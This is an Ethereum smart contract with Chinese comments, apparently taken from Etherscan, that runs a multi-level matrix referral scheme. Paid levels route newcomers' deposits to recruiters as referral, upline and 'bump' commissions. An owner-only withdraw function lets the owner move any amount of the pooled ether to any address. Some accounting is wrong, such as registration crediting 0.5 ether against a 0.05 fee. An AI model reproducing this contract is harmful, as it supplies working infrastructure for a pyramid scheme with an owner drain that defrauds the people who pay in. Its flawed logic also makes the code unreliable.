/**
 *Submitted for verification at Etherscan.io on 2021-07-16
*/

/**
 *Submitted for verification at Etherscan.io on 2021-07-12
*/

pragma solidity >=0.4.23 <0.6.0;

contract CDcontract {
    // 用户
    struct User {
        uint id;            //用户ID
        address referrer;   //推荐人地址
        uint partnersCount; // 团队总人数
        uint area;   //左区还是右区 1左2右
        uint areaUserId;//区域会员信息编号

        mapping(uint8 => bool) activeX3Levels; // X3模块：记录X3点位是否开通
        mapping(uint8 => bool) activeX6Levels; // X6模块：记录X6点位是否开通
        mapping(uint8 => bool) activeGoldLevels; // 黄金模块：记录黄金点位是否开通

        mapping(uint8 => X3) x3Matrix; // 对应X3的12个矩阵
        mapping(uint8 => X6) x6Matrix; // 对应X6的12个矩阵
        mapping(uint8 => Gold) goldMatrix; // 对应Gold的12个矩阵
    }

    struct X3 {
        address currentReferrer; // 当前落座点位的上级地址
        address[] referrals; // 矩阵内已占点位的地址（下级地址）
        bool blocked; // 是否阻塞
        uint reinvestCount; // 复投次数
    }

    struct X6 {
        address currentReferrer; // 当前落座点位的上级地址
        address[] firstLevelReferrals; // 第一级点位地址
        address[] secondLevelReferrals; // 第二级点位地址
        bool blocked; // 是否阻塞（烧伤）
        uint reinvestCount; // 复投次数

        address closedPart; //   封锁的地址
    }

    struct Gold {
        address currentReferrer; // 当前落座点位的上级地址
        address[] firstLevelReferrals; // 第一级点位地址
        address[] secondLevelReferrals; // 第二级点位地址
        address[] thirdLevelReferrals; // 第三级点位地址
        address[] fourthLevelReferrals; // 第四级点位地址
    }

    struct GoldPlace {
        address place;  //上级
        address referrer; //推荐人
    }

    uint8 public constant LAST_LEVEL = 12;

    uint public leftAmount = 0 ether;

    uint public rightAmount = 0 ether;

    uint public lastUserId = 2;

    uint public leftLastUserId = 2;

    uint public rightLastUserId = 2;

    mapping(address => User) public users; // 所有用户数据：地址——>用户数据

    mapping(uint => address) public idToAddress; // 所有ID数据：ID——>地址

    mapping(uint => address) public leftIdToAddress;

    mapping(uint => address) public rightIdToAddress;

    mapping(address => GoldPlace) public tract; //

    address public owner;

    mapping(uint8 => uint) public levelPrice; // 矩阵价格：矩阵位数——>激活矩阵的价格

    // 以下event为事件，意思是当用户触发了某些条件的时候，合约就会给用户发送一些数据，这里也可以理解为给用户发送消息
    // 注册消息：发送用户地址、用户推荐人地址、用户ID、推荐人ID
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId, uint area, address place);
    // 复投消息：用户地址、用户当前推荐人地址、调用者、矩阵模块（X3 or X6）、矩阵等级
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    // 矩阵升级（激活）消息：用户地址、用户推荐人地址、矩阵模块（X3 or X6）、矩阵等级
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    //
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    // 烧伤消息：接收者地址、点位来源地址、矩阵模块（X3 or X6）、矩阵等级
    event MissedEthReceive(address indexed receiver, address indexed from, uint8 matrix, uint8 level);
    // 发送ETH消息：ETH来源地址、ETH接收者地址、矩阵模块（X3 or X6）、矩阵等级
    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level);
    //奖金发放事件;to收钱地址;rootAddress源头地址;matrix矩阵类型,1=x3,2=x6,3=xg;level矩阵等级;commissionType返奖类型,1=推荐,2=见点,3=对碰;age返奖代数;price返奖数量;
    event CommissionSend(address indexed to, address indexed rootAddress, uint8 matrix, uint8 level, uint8 commissionType, uint age, uint price);


    constructor(address ownerAddress) public {

        levelPrice[1] = 0.025 ether;

        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i - 1] * 2;
        }
        // 记录创始人
        owner = ownerAddress;

        User memory user = User({
        id : 1, // ID为1
        referrer : address(0),
        partnersCount : uint(1),
        area : 1,
        areaUserId : 1
        });

        GoldPlace memory Goldplace = GoldPlace({
        place : address(0), //上级
        referrer : address(0)//推荐人
        });

        users[ownerAddress] = user;

        tract[ownerAddress] = Goldplace;

        leftIdToAddress[1] = ownerAddress;

        rightIdToAddress[1] = ownerAddress;

        idToAddress[1] = ownerAddress;

        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
            users[ownerAddress].activeGoldLevels[i] = true;
        }
    }

    function() external payable {

        if (msg.data.length == 0) {
            return registration(msg.sender, owner, 1);
        }
        registration(msg.sender, bytesToAddress(msg.data), 1);
    }

    function registrationExt(address referrerAddress, uint area) external payable {

        registration(msg.sender, referrerAddress, area);
    }

    function buyNewLevel(uint8 matrix, uint8 level) external payable {

        require(isUserExists(msg.sender), "user is not exists. Register first.");

        require(matrix == 1 || matrix == 2, "invalid matrix");

        require(msg.value == levelPrice[level], "invalid price");

        require(level > 1 && level <= LAST_LEVEL, "invalid level");

        if (users[msg.sender].area == 1) {
            leftAmount += msg.value;
        } else {
            rightAmount += msg.value;
        }

        if (matrix == 1) {

            require(!users[msg.sender].activeX3Levels[level], "level already activated");

            if (users[msg.sender].x3Matrix[level - 1].blocked) {
                users[msg.sender].x3Matrix[level - 1].blocked = false;
            }

            address freeX3Referrer = findFreeX3Referrer(msg.sender, level);

            users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;

            users[msg.sender].activeX3Levels[level] = true;

            updateX3Referrer(msg.sender, freeX3Referrer, level);

            emit Upgrade(msg.sender, freeX3Referrer, 1, level);

        } else {

            require(!users[msg.sender].activeX6Levels[level], "level already activated");

            if (users[msg.sender].x6Matrix[level - 1].blocked) {
                users[msg.sender].x6Matrix[level - 1].blocked = false;
            }

            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);

            users[msg.sender].activeX6Levels[level] = true;

            updateX6Referrer(msg.sender, freeX6Referrer, level);

            emit Upgrade(msg.sender, freeX6Referrer, 2, level);

        }
    }

    function buyGoldNewLevel(uint8 matrix, uint8 level) external payable {

        require(isUserExists(msg.sender), "user is not exists. Register first.");

        require(matrix == 3, "invalid matrix");

        require(msg.value == levelPrice[level], "invalid price");

        require(level >= 1 && level <= LAST_LEVEL, "invalid level");

        require(users[msg.sender].activeGoldLevels[level] != true, "user level error");
        if (level > 1) {

            require(users[msg.sender].activeGoldLevels[level - 1] == true, "user last level error");

        }

        if (matrix == 3) {

            address Referrer = users[msg.sender].referrer;
            address userPlace = tract[msg.sender].place;
            uint price = levelPrice[level];
            if (users[msg.sender].area == 1) {
                leftAmount += price;
            } else {
                rightAmount += price;
            }
            users[msg.sender].activeGoldLevels[level] = true;
            users[msg.sender].goldMatrix[level].currentReferrer = userPlace;
            updateGoldReferrer(msg.sender, userPlace, level);

            referralCommission(msg.sender, 3, level, price);

            pointCommission(msg.sender, 3, level, price);

            emit Upgrade(msg.sender, Referrer, 3, level);
        }
    }

    function registration(address userAddress, address referrerAddress, uint area) private {

        require(msg.value == 0.05 ether, "registration cost 0.05");

        require(area == 1 || area == 2, "area must 1 or 2");

        require(!isUserExists(userAddress), "user exists");

        require(isUserExists(referrerAddress), "referrer not exists");

        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }

        require(size == 0, "cannot be a contract");
        address place;
        uint areaUserId;

        if (area == 1) {
            leftAmount += 0.5 ether;
            place = leftIdToAddress[leftLastUserId - 1];
            areaUserId = leftLastUserId;
            leftIdToAddress[areaUserId] = userAddress;
            leftLastUserId++;
            if (rightLastUserId >= leftLastUserId) {
                bumpCommission(userAddress, place, 0.05 ether);
            }
        } else {
            rightAmount += 0.5 ether;
            place = rightIdToAddress[rightLastUserId - 1];
            areaUserId = rightLastUserId;
            rightIdToAddress[areaUserId] = userAddress;
            rightLastUserId++;
            if (leftLastUserId >= rightLastUserId) {
                bumpCommission(userAddress, place, 0.05 ether);
            }
        }

        User memory user = User({
        id : lastUserId, // 新用户的ID为最新ID
        referrer : referrerAddress, // 推荐人地址为传入的推荐人地址
        partnersCount : 0, // 团队人数为0
        area : area,
        areaUserId : areaUserId
        });
        users[userAddress] = user;

        idToAddress[lastUserId] = userAddress;

        users[userAddress].referrer = referrerAddress;

        users[userAddress].activeX3Levels[1] = true;
        users[userAddress].activeX6Levels[1] = true;

        lastUserId++;

        users[referrerAddress].partnersCount++;

        address freeX3Referrer = findFreeX3Referrer(userAddress, 1);

        users[userAddress].x3Matrix[1].currentReferrer = freeX3Referrer;

        updateX3Referrer(userAddress, freeX3Referrer, 1);

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 1), 1);

        GoldPlace memory registrationplace = GoldPlace({
        place : place,
        referrer : referrerAddress
        });

        tract[userAddress] = registrationplace;

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id, area, place);
    }

    function getUserPlace(uint area) public returns (address place) {
        if (area == 1) {
            return leftIdToAddress[leftLastUserId - 1];
        } else {
            return rightIdToAddress[rightLastUserId - 1];
        }
    }

    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    function findFreeX3Referrer(address userAddress, uint8 level) public view returns (address) {
        while (true) {

            if (users[users[userAddress].referrer].activeX3Levels[level]) {

                return users[userAddress].referrer;
            }

            userAddress = users[userAddress].referrer;
        }
    }

    function findFreeX6Referrer(address userAddress, uint8 level) public view returns (address) {
        while (true) {

            if (users[users[userAddress].referrer].activeX6Levels[level]) {

                return users[userAddress].referrer;
            }

            userAddress = users[userAddress].referrer;
        }
    }

    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {

        users[referrerAddress].x3Matrix[level].referrals.push(userAddress);

        if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {

            emit NewUserPlace(userAddress, referrerAddress, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));

            referralCommission(userAddress, 1, level, levelPrice[level]);
            pointCommission(userAddress, 1, level, levelPrice[level]);
            return;
        }

        emit NewUserPlace(userAddress, referrerAddress, 1, level, 3);


        users[referrerAddress].x3Matrix[level].referrals = new address[](0);

        if (!users[referrerAddress].activeX3Levels[level + 1] && level != LAST_LEVEL) {

            users[referrerAddress].x3Matrix[level].blocked = true;
        }

        if (referrerAddress != owner) {

            address freeReferrerAddress = findFreeX3Referrer(referrerAddress, level);

            if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {

                users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;
            }

            users[referrerAddress].x3Matrix[level].reinvestCount++;

            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);

            updateX3Referrer(referrerAddress, freeReferrerAddress, level);
        } else {

            referralCommission(userAddress, 1, level, levelPrice[level]);
            pointCommission(userAddress, 1, level, levelPrice[level]);

            users[owner].x3Matrix[level].reinvestCount++;

            emit Reinvest(owner, address(0), userAddress, 1, level);
        }
    }

    // 升级推荐人的X6矩阵：传入用户地址、实际推荐人地址、对应矩阵等级
    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private {

        require(users[referrerAddress].activeX6Levels[level], "500. Referrer level is inactive");


        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length < 2) {

            users[referrerAddress].x6Matrix[level].firstLevelReferrals.push(userAddress);

            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].firstLevelReferrals.length));

            users[userAddress].x6Matrix[level].currentReferrer = referrerAddress;

            if (referrerAddress == owner) {
                referralCommission(userAddress, 2, level, levelPrice[level]);
                pointCommission(userAddress, 2, level, levelPrice[level]);
                return;
            }

            address ref = users[referrerAddress].x6Matrix[level].currentReferrer;

            users[ref].x6Matrix[level].secondLevelReferrals.push(userAddress);

            uint len = users[ref].x6Matrix[level].firstLevelReferrals.length;

            if ((len == 2) &&
            (users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) &&
                (users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress)) {

                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {

                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {

                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }

            } else if ((len == 1 || len == 2) &&
                users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) {

                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {

                    emit NewUserPlace(userAddress, ref, 2, level, 3);
                } else {

                    emit NewUserPlace(userAddress, ref, 2, level, 4);
                }

            } else if (len == 2 && users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress) {

                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {

                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {

                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }
            }

            return updateX6ReferrerSecondLevel(userAddress, ref, level);
        }


        users[referrerAddress].x6Matrix[level].secondLevelReferrals.push(userAddress);


        if (users[referrerAddress].x6Matrix[level].closedPart != address(0)) {

            if ((users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
            users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]) &&
                (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
                users[referrerAddress].x6Matrix[level].closedPart)) {

                updateX6(userAddress, referrerAddress, level, true);

                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);

            } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
                users[referrerAddress].x6Matrix[level].closedPart) {
                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);

            } else {
                updateX6(userAddress, referrerAddress, level, false);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            }
        }

        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[1] == userAddress) {
            updateX6(userAddress, referrerAddress, level, false);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);

        } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == userAddress) {
            updateX6(userAddress, referrerAddress, level, true);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
        }

        if (users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length <=
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length) {
            updateX6(userAddress, referrerAddress, level, false);
        } else {
            updateX6(userAddress, referrerAddress, level, true);
        }
        updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
    }

    function updateGoldReferrer(address userAddress, address referrerAddress, uint8 level) private {
        if (users[userAddress].activeGoldLevels[level]) {
            Gold memory referralGold = users[referrerAddress].goldMatrix[level];
            if (referralGold.fourthLevelReferrals.length < 16) {
                if (referralGold.thirdLevelReferrals.length < 8) {
                    if (referralGold.secondLevelReferrals.length < 4) {
                        if (referralGold.firstLevelReferrals.length < 2) {
                            users[referrerAddress].goldMatrix[level].firstLevelReferrals.push(userAddress);
                        } else {
                            users[referrerAddress].goldMatrix[level].secondLevelReferrals.push(userAddress);
                        }
                    } else {
                        users[referrerAddress].goldMatrix[level].thirdLevelReferrals.push(userAddress);
                    }
                } else {
                    users[referrerAddress].goldMatrix[level].fourthLevelReferrals.push(userAddress);
                }
            } else {
                users[referrerAddress].goldMatrix[level].firstLevelReferrals = [userAddress];
                users[referrerAddress].goldMatrix[level].secondLevelReferrals = new address[](0);
                users[referrerAddress].goldMatrix[level].thirdLevelReferrals = new address[](0);
                users[referrerAddress].goldMatrix[level].fourthLevelReferrals = new address[](0);
            }
        }
    }

    function updateX6(address userAddress, address referrerAddress, uint8 level, bool x2) private {
        if (!x2) {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[0], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 2 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[0];
        } else {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[1], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 4 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[1];
        }
    }

    function updateX6ReferrerSecondLevel(address userAddress, address referrerAddress, uint8 level) private {
        if (users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4) {
            referralCommission(userAddress, 2, level, levelPrice[level]);
            pointCommission(userAddress, 2, level, levelPrice[level]);
            return;
        }

        address[] memory x6 = users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].firstLevelReferrals;

        if (x6.length == 2) {//
            if (x6[0] == referrerAddress ||
                x6[1] == referrerAddress) {
                users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
            } else if (x6.length == 1) {
                if (x6[0] == referrerAddress) {
                    users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
                }
            }
        }

        users[referrerAddress].x6Matrix[level].firstLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].secondLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].closedPart = address(0);

        if (!users[referrerAddress].activeX6Levels[level + 1] && level != LAST_LEVEL) {
            users[referrerAddress].x6Matrix[level].blocked = true;
        }

        users[referrerAddress].x6Matrix[level].reinvestCount++;

        if (referrerAddress != owner) {
            address freeReferrerAddress = findFreeX6Referrer(referrerAddress, level);

            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 2, level);
            updateX6Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            emit Reinvest(owner, address(0), userAddress, 2, level);
            referralCommission(userAddress, 2, level, levelPrice[level]);
            pointCommission(userAddress, 2, level, levelPrice[level]);
        }
    }

    function usersActiveX3Levels(address userAddress, uint8 level) public view returns (bool) {
        return users[userAddress].activeX3Levels[level];
    }

    function usersActiveX6Levels(address userAddress, uint8 level) public view returns (bool) {
        return users[userAddress].activeX6Levels[level];
    }

    function usersX3Matrix(address userAddress, uint8 level) public view returns (address, address[] memory, bool) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
        users[userAddress].x3Matrix[level].referrals,
        users[userAddress].x3Matrix[level].blocked);
    }

    function usersX6Matrix(address userAddress, uint8 level) public view returns (address, address[] memory, address[] memory, bool, address) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
        users[userAddress].x6Matrix[level].firstLevelReferrals,
        users[userAddress].x6Matrix[level].secondLevelReferrals,
        users[userAddress].x6Matrix[level].blocked,
        users[userAddress].x6Matrix[level].closedPart);
    }

    //推荐奖，推荐人45%，二级推荐人5%
    function referralCommission(address userAddress, uint8 matrix, uint8 level, uint price) private {
        address referrerAddress = users[userAddress].referrer;
        if (referrerAddress != address(0)) {
            uint referralCommission = price * 45 / 100;
            address(uint160(referrerAddress)).transfer(referralCommission);
            address reReferrerAddress = users[referrerAddress].referrer;
            emit CommissionSend(referrerAddress, userAddress, matrix, level, 1, 1, referralCommission);
            if (reReferrerAddress != address(0)) {
                uint reReferralCommission = price * 5 / 100;
                address(uint160(reReferrerAddress)).transfer(reReferralCommission);
                emit CommissionSend(reReferrerAddress, userAddress, matrix, level, 1, 2, reReferralCommission);
            }
        }
    }

    //见点奖，上级每人0.5%
    function pointCommission(address userAddress, uint8 matrix, uint8 level, uint price) private {
        uint i;
        address selectAddress = userAddress;
        uint pointCommission = price * 5 / 1000;
        for (i = 1; i <= 12; i++) {
            address referrerAddress = users[selectAddress].referrer;
            if (referrerAddress != address(0)) {
                selectAddress = referrerAddress;
                address(uint160(referrerAddress)).transfer(pointCommission);
                emit CommissionSend(referrerAddress, userAddress, matrix, level, 2, i, pointCommission);
            } else {
                break;
            }
        }
    }

    //对碰奖，上级最多获得入金12%
    function bumpCommission(address userAddress, address placeAddress, uint price) private {
        if (placeAddress != address(0)) {
            uint minAreaAmount = leftAmount < rightAmount ? leftAmount : rightAmount;
            uint commissionPercent = getBumpCommissionPercent(minAreaAmount);
            uint bumpCommission = price * commissionPercent / 100;
            address(uint160(placeAddress)).transfer(bumpCommission);
            emit CommissionSend(placeAddress, userAddress, 0, 0, 3, 1, bumpCommission);
        }
    }

    //获取对碰奖比例
    function getBumpCommissionPercent(uint minAreaAmount) private returns (uint){
        uint commissionPercent;
        if (minAreaAmount >= 12.8 ether) {
            commissionPercent = 12;
        } else {
            if (minAreaAmount >= 1.6 ether) {
                commissionPercent = 10;
            } else {
                if (minAreaAmount >= 0.2 ether) {
                    commissionPercent = 8;
                } else {
                    commissionPercent = 6;
                }
            }
        }
        return commissionPercent;
    }

    function withdraw(address _to, uint _price) external {
        require(msg.sender == owner);
        address(uint160(_to)).transfer(_price);
    }
}